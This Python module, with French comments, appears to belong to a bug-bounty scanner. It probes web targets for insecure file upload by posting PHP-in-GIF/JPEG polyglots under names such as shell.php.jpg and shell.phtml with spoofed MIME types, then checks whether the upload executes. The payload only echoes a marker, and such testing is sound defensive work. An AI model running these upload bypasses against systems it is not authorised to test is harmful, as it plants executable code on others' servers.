"""Scanner upload de fichiers vulnérables."""

from __future__ import annotations

import io
import re

import requests

from .utils import Finding, extract_forms, get_base_url, normalize_url, safe_request

POLYGLOT_PHP = b'GIF89a<?php echo "BOUNTYSTRIKE_UPLOAD_TEST"; ?>'
POLYGLOT_JPG = b'\xff\xd8\xff\xe0' + b'<?php echo "BOUNTYSTRIKE"; ?>'


class UploadScanner:
    """Teste les vulnérabilités d'upload de fichiers."""

    def __init__(self, target: str, session: requests.Session):
        self.target = normalize_url(target)
        self.base_url = get_base_url(self.target)
        self.session = session
        self.findings: list[Finding] = []

    def run_full_scan(self) -> list[Finding]:
        resp = safe_request(self.session, "GET", self.target)
        if not resp:
            return self.findings

        upload_paths = [f"{self.base_url}/upload", f"{self.base_url}/api/upload", self.target]
        for form in extract_forms(resp.text):
            file_fields = [f["name"] for f in form["fields"] if f["type"] == "file"]
            if file_fields:
                self._test_form_upload(form, resp.text)

        for path in upload_paths:
            self._test_direct_upload(path)
        return self.findings

    def _test_form_upload(self, form: dict, html: str) -> None:
        import urllib.parse
        action = urllib.parse.urljoin(self.target, form.get("action", ""))
        file_field = next((f["name"] for f in form["fields"] if f["type"] == "file"), "file")

        tests = [
            ("shell.php", POLYGLOT_PHP, "application/x-php"),
            ("shell.php.jpg", POLYGLOT_PHP, "image/jpeg"),
            ("test.gif", POLYGLOT_PHP, "image/gif"),
            ("shell.phtml", POLYGLOT_PHP, "application/octet-stream"),
        ]
        for filename, content, mime in tests:
            files = {file_field: (filename, io.BytesIO(content), mime)}
            data = {f["name"]: "test" for f in form["fields"] if f["type"] != "file" and f["name"]}
            resp = safe_request(self.session, "POST", action or self.target, data=data, files=files)
            if not resp:
                continue
            if resp.status_code in (200, 201) and any(
                kw in resp.text.lower() for kw in ("uploaded", "success", filename.lower(), "/uploads/")
            ):
                self.findings.append(
                    Finding(
                        title=f"Upload de fichier accepté: {filename}",
                        severity="high",
                        category="File Upload",
                        url=action or self.target,
                        description=f"Fichier {filename} ({mime}) uploadé avec succès",
                        evidence=resp.text[:200],
                        remediation="Valider extension, MIME, et stocker hors webroot",
                    )
                )
                # Chercher si exécutable
                paths = re.findall(r'["\']([^"\']*' + re.escape(filename) + r')["\']', resp.text)
                for p in paths[:3]:
                    exec_resp = safe_request(self.session, "GET", urllib.parse.urljoin(self.base_url, p))
                    if exec_resp and b"BOUNTYSTRIKE" in exec_resp.content:
                        self.findings.append(
                            Finding(
                                title="Webshell exécutable après upload",
                                severity="critical",
                                category="File Upload RCE",
                                url=urllib.parse.urljoin(self.base_url, p),
                                description="Fichier uploadé exécutable côté serveur",
                                evidence=p,
                            )
                        )

    def _test_direct_upload(self, url: str) -> None:
        files = {"file": ("test.php", io.BytesIO(POLYGLOT_PHP), "image/jpeg")}
        resp = safe_request(self.session, "POST", url, files=files)
        if resp and resp.status_code in (200, 201) and "upload" in resp.text.lower():
            self.findings.append(
                Finding(
                    title=f"Endpoint upload trouvé: {url}",
                    severity="medium",
                    category="File Upload",
                    url=url,
                    description="Endpoint d'upload actif",
                    evidence=resp.text[:150],
                )
            )
